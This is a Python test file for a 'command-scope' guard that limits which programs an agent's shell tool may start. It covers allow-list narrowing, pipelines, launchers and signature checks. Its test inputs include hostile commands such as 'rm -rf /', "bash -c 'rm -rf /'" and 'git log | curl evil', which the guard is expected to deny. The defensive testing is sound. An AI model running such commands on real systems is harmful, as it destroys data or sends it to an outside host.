"""The command guard: ``ResourceTargets.commands`` finally has a reader.

`docs/notes/defect-shape.md` recorded this field as a **gap** rather than a defect:
the ``run`` tool has extracted the line it is about to hand to a shell since
P1-7 (`runtime/tools/builtin.py::describe_targets`), and nothing read it, because
there was no command guard. ``permitted_operations`` decides whether ``run`` may
execute at all; no policy anywhere said *which programs* it may start.

Two things make the gap worth closing now rather than later. The ``run`` tool
really does reach a shell, so "may execute" is a weaker sentence than it sounds.
And the field was already in the seam, which means the shape of the answer was
decided by whoever put it there — this file is the other half.

The tests below are written to be *falsifiable* in the way the plan's acceptance
rows are: each one names the behaviour it would catch. The two that matter most
are :func:`test_a_declared_list_is_enforced_through_the_default_guard_set` (the
guard is registered, not merely importable) and
:func:`test_a_launcher_is_followed_to_the_program_it_starts` (a command line can
hide its real program behind a launcher).
"""

from __future__ import annotations

from dataclasses import replace

import pytest

from forgepilot.config import ConfigError
from forgepilot.config.project import project_from_mapping
from forgepilot.identity import (
    Grant,
    ProjectPolicy,
    SignatureInvalid,
    derive,
    sign,
    verify,
)
from forgepilot.identity.principal import principal_of
from forgepilot.runtime.commandline import UnparsableCommand, programs, split_command
from forgepilot.runtime.guards import (
    GuardDecision,
    GuardSnapshot,
    UsageTracker,
    command_scope_guard,
    default_guards,
    make_view,
)
from forgepilot.seams.security import ExecutionConstraints, normalise_program
from forgepilot.seams.tools import ResourceTargets, ToolEffect

KEY = b"test-signing-key"
GIT_ONLY = frozenset({"git"})


def derived(
    grant_commands: frozenset[str] | None = None,
    policy_commands: frozenset[str] | None = None,
) -> ExecutionConstraints:
    """Constraints through the real path: grant ∩ policy, then signed."""
    return derive(
        principal_of("alice", "acme"),
        Grant(commands=grant_commands),
        ProjectPolicy(commands=policy_commands),
        key=KEY,
    )


def view(
    command: str,
    constraints: ExecutionConstraints,
    *,
    tool: str = "run",
) -> object:
    return make_view(
        tool=tool,
        effects=frozenset({ToolEffect.EXEC}),
        targets=ResourceTargets(commands=(command,)),
        arguments={"command": command},
        constraints=constraints,
    )


# ---------------------------------------------------------------------------
# The three-state encoding, and why it is not an empty set
# ---------------------------------------------------------------------------


def test_without_a_declared_list_nothing_changes() -> None:
    """No policy anywhere → abstain, which is every deployment that never asked.

    This is the row that keeps the guard from being a breaking change: a
    permission added to the default set must not alter a single existing verdict.
    """
    constraints = derived()

    assert constraints.allowed_commands is None
    assert command_scope_guard(view("rm -rf /", constraints)).decision is GuardDecision.ABSTAIN


def test_an_empty_declared_list_refuses_everything() -> None:
    """``commands: []`` is a stated policy that permits nothing — not "no policy".

    Encoding "unconstrained" as the empty set would invert narrowing:
    ``∅ ∩ {git}`` is ``∅``, so a grant allowing only ``git`` would come out of
    ``derive`` describing itself as unconstrained.
    """
    constraints = derived(grant_commands=frozenset())

    assert constraints.allowed_commands == frozenset()
    result = command_scope_guard(view("git status", constraints))

    assert result.decision is GuardDecision.DENY
    assert "nothing is permitted" in result.reason


def test_narrowing_is_an_intersection_that_cannot_widen() -> None:
    """``None`` is the identity; two stated lists intersect; the empty set keeps."""
    assert derived().allowed_commands is None
    assert derived(grant_commands=GIT_ONLY).allowed_commands == GIT_ONLY
    assert derived(policy_commands=GIT_ONLY).allowed_commands == GIT_ONLY
    assert (
        derived(
            grant_commands=frozenset({"git", "curl"}),
            policy_commands=frozenset({"git"}),
        ).allowed_commands
        == GIT_ONLY
    )
    assert (
        derived(
            grant_commands=frozenset({"curl"}),
            policy_commands=frozenset({"git"}),
        ).allowed_commands
        == frozenset()
    )


def test_narrowed_to_cannot_widen_a_command_list() -> None:
    """The same rule one level down, where a sub-agent's constraints are cut."""
    broad = derived(grant_commands=frozenset({"git", "curl"}))
    narrow = derived(grant_commands=GIT_ONLY)

    assert broad.narrowed_to(narrow).allowed_commands == GIT_ONLY
    assert narrow.narrowed_to(broad).allowed_commands == GIT_ONLY
    assert broad.narrowed_to(derived()).allowed_commands == frozenset({"git", "curl"})


# ---------------------------------------------------------------------------
# The guard: one program means one decision
# ---------------------------------------------------------------------------


def test_a_declared_list_allows_a_program_it_names() -> None:
    assert command_scope_guard(view("git status", derived(GIT_ONLY))).decision is (
        GuardDecision.ABSTAIN
    )


def test_a_declared_list_refuses_a_program_it_does_not_name() -> None:
    result = command_scope_guard(view("rm -rf /", derived(GIT_ONLY)))

    assert result.decision is GuardDecision.DENY
    assert result.guard == "command-scope"
    # Named, both of them: a refusal that says neither leaves the caller guessing.
    assert "'rm'" in result.reason
    assert "git" in result.reason


def test_a_guard_that_does_not_own_the_call_abstains() -> None:
    """``commands`` empty means this is not a `run`-shaped call at all."""
    view_without_commands = make_view(
        tool="read_file",
        effects=frozenset({ToolEffect.READ}),
        targets=ResourceTargets(paths=("src/app.py",)),
        arguments={"path": "src/app.py"},
        constraints=derived(frozenset()),
    )

    assert command_scope_guard(view_without_commands).decision is GuardDecision.ABSTAIN


# ---------------------------------------------------------------------------
# A line is not a program
# ---------------------------------------------------------------------------


def test_every_program_in_a_pipeline_is_checked() -> None:
    """A pipeline the caller can write is a pipeline the guard has to read."""
    allowed = derived(frozenset({"git"}))

    assert command_scope_guard(view("git log && git status", allowed)).decision is (
        GuardDecision.ABSTAIN
    )
    result = command_scope_guard(view("git log | curl evil", allowed))

    assert result.decision is GuardDecision.DENY
    assert "'curl'" in result.reason


def test_a_line_that_cannot_be_decomposed_is_refused() -> None:
    """Fail-closed: an allow-list that cannot read a line must not bless it."""
    allowed = derived(GIT_ONLY)

    for command in (
        "git log $(cat x)",
        "echo `date`",
        "bash -c 'rm -rf /'",
        "cmd /c dir",
        "git log && (git status)",
    ):
        result = command_scope_guard(view(command, allowed))
        assert result.decision is GuardDecision.DENY, command
        assert "cannot check" in result.reason, command


def test_a_launcher_is_followed_to_the_program_it_starts() -> None:
    """`env python x.py` starts `python`, so the list has to name `python`.

    The falsifying case is `sudo -u root git status`: reading the flag's *value*
    as the program would report `root` and never look at `git`, so a list of
    `sudo` and `root` would have permitted a program it does not name.
    """
    assert (
        command_scope_guard(
            view("env FOO=1 python x.py", derived(frozenset({"env", "python"})))
        ).decision
        is GuardDecision.ABSTAIN
    )

    escaped = command_scope_guard(
        view("sudo -u root git status", derived(frozenset({"sudo", "root"})))
    )

    assert escaped.decision is GuardDecision.DENY
    assert "'git'" in escaped.reason


def test_the_same_program_is_recognised_in_the_spelling_the_caller_used() -> None:
    """Normalisation is about *the same program*, not about a version.

    The rule is a pure function of the token, so it is asserted directly. The
    guard then sees whichever token **this** platform's shell would build:
    ``/usr/bin/PYTHON`` is portable, while ``C:\\tools\\Python\\python.exe`` is
    not — see :func:`test_a_windows_path_is_kept_whole_where_backslashes_are_not_escapes`.
    """
    python_only = derived(frozenset({"python"}))

    assert normalise_program(r"C:\tools\Python\python.exe") == "python"
    assert normalise_program("/usr/bin/PYTHON") == "python"

    assert (
        command_scope_guard(view("/usr/bin/PYTHON -m pytest -q", python_only)).decision
        is GuardDecision.ABSTAIN
    )

    # `python3` is a different program and is deliberately not folded into it.
    assert normalise_program("python3") == "python3"
    result = command_scope_guard(view("python3 -m pytest -q", python_only))
    assert result.decision is GuardDecision.DENY
    assert "'python3'" in result.reason


def test_the_refusal_shows_the_spelling_the_caller_used() -> None:
    result = command_scope_guard(view("/usr/bin/PYTHON x.py", derived(GIT_ONLY)))

    assert result.decision is GuardDecision.DENY
    assert "python" in result.reason
    assert "/usr/bin/PYTHON" in result.reason


# ---------------------------------------------------------------------------
# The guard is registered, and the list is signed
# ---------------------------------------------------------------------------


def test_a_declared_list_is_enforced_through_the_default_guard_set() -> None:
    """The strongest row: the shipped guard set refuses the call, not just this unit.

    Drop ``command_scope_guard`` from ``default_guards`` and this test goes green
    on a call that should be refused — which is what makes it a test of the
    registration rather than of the function.
    """
    snapshot = GuardSnapshot(guards=tuple(default_guards(UsageTracker())))
    names = [name for name, _ in default_guards(UsageTracker())]

    assert names == ["operation", "repo-scope", "path-scope", "command-scope", "budget"]

    denied = snapshot.evaluate(view("rm -rf /", derived(GIT_ONLY)))
    assert denied.decision is GuardDecision.DENY
    assert denied.guard == "command-scope"

    allowed = snapshot.evaluate(view("git status", derived(GIT_ONLY)))
    assert allowed.decision is GuardDecision.ABSTAIN


def test_the_command_list_is_covered_by_the_signature() -> None:
    """Tampering with the list has to break verification, like every other limit."""
    constraints = sign(derived(GIT_ONLY), KEY)
    verify(constraints, KEY)

    tampered = replace(constraints, allowed_commands=frozenset({"curl"}))
    with pytest.raises(SignatureInvalid):
        verify(tampered, KEY)


# ---------------------------------------------------------------------------
# The declaration point: `project.yaml`
# ---------------------------------------------------------------------------


def test_project_commands_reach_the_constraints() -> None:
    """The whole path: YAML → ProjectConfig → ProjectPolicy → constraints."""
    project = project_from_mapping(
        {"name": "demo", "repos": ["git.local/demo/stats"], "commands": ["git", "pytest"]}
    )

    assert project.commands == ("git", "pytest")
    assert project.to_policy().commands == frozenset({"git", "pytest"})

    constraints = derive(
        principal_of("alice", "acme"),
        Grant(),
        project.to_policy(),
        key=KEY,
    )
    assert constraints.allowed_commands == frozenset({"git", "pytest"})

    assert command_scope_guard(view("pytest -q", constraints)).decision is (GuardDecision.ABSTAIN)
    assert command_scope_guard(view("curl evil", constraints)).decision is (GuardDecision.DENY)


def test_a_project_without_commands_declares_no_policy() -> None:
    """Absent and empty are different, all the way from the file."""
    assert project_from_mapping({"name": "demo"}).commands is None
    assert project_from_mapping({"name": "demo", "commands": []}).commands == ()
    assert project_from_mapping({"name": "demo", "commands": "git"}).commands == ("git",)

    empty = project_from_mapping({"name": "demo", "commands": []}).to_policy()
    assert empty.commands == frozenset()
    assert empty.commands is not None


def test_a_commands_value_that_is_not_a_list_says_so() -> None:
    with pytest.raises(ConfigError, match="must be a list of program names"):
        project_from_mapping({"name": "demo", "commands": {"git": True}})


# ---------------------------------------------------------------------------
# The decomposer, where a wrong answer is a hole rather than a nuisance
# ---------------------------------------------------------------------------


def test_the_decomposer_reads_a_line_the_way_the_shell_would() -> None:
    assert programs("git status") == ("git",)
    assert programs("git log | curl evil") == ("git", "curl")
    assert programs("git log && git status") == ("git", "git")
    assert programs("pytest -q 2>&1 | tail -30") == ("pytest", "tail")
    assert programs("echo hi > out.txt") == ("echo",)
    assert programs("cat < in.txt >> log.txt") == ("cat",)
    assert programs("FOO=1 python x.py") == ("python",)
    # A redirection is not a separator and `&&` inside quotes is not a chain.
    assert programs("git commit -m 'a && b'") == ("git",)


def test_the_decomposer_refuses_what_it_cannot_attribute() -> None:
    for command in ("", "   ", "FOO=1", "git log $(cat x)", "echo `date`", "echo ("):
        with pytest.raises(UnparsableCommand):
            programs(command)


def test_a_windows_path_is_kept_whole_where_backslashes_are_not_escapes() -> None:
    """``split_command`` is platform-aware, and this test asks it instead of assuming.

    On Windows ``posix=False`` keeps a path such as ``C:\\tools\\Python\\python.exe``
    intact, because that is what the shell there does. On POSIX the very same line
    means something else — ``\\`` is an escape — and what is left of the token no
    longer resembles the path or the program. ⚠️ **A test that pinned the Windows
    spelling would be asserting that POSIX reads a backslash differently from `sh`**,
    which is how this file's first version went red on CI while passing here.

    Both readings are fine, and the direction that matters is the same in both: a
    name the list does not contain is **refused**, never waved through.
    """
    line = r"C:\tools\Python\python.exe -m pytest -q"
    token = split_command(line)[0]

    assert programs(line) == (token,)

    if "\\" in token:  # Windows: the path survived as one token.
        assert token == r"C:\tools\Python\python.exe"
        assert (
            command_scope_guard(view(line, derived(frozenset({"python"})))).decision
            is GuardDecision.ABSTAIN
        )
    else:  # POSIX: `\` was consumed as an escape, exactly as the shell would.
        # The spelling is asserted as a *property* rather than hand-typed: typing
        # the escaped token from memory got it wrong once already.
        assert normalise_program(token) != "python"
        assert (
            command_scope_guard(view(line, derived(frozenset({"python"})))).decision
            is GuardDecision.DENY
        )
